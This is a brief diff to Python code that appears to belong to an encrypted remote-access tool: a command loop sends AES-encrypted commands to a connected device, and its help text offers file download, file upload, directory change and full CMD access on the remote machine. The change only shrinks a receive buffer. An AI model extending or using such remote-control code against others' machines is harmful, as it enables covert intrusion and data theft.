@@ -198,7 +198,7 @@ def commands(conn,key):
                     pass       
             elif cmd[:2] == "cd":
                 conn.send(cipher.encrypt(pad(cmd.encode("utf-8"),32)))
-                y = conn.recv(1024)
+                y = conn.recv(32)
                 y = unpad(decryptcipher.decrypt(y),32).decode("utf-8")
             elif cmd == "help":
                 print("List of commands\nquit ~ exits device connection\ndownload_file ~ downloads file\nsend_file ~ sends file (note cannot be exe)\ncd (directory) ~ changes directory\nOther commands include the CMD, as access to CMD commands is given here")
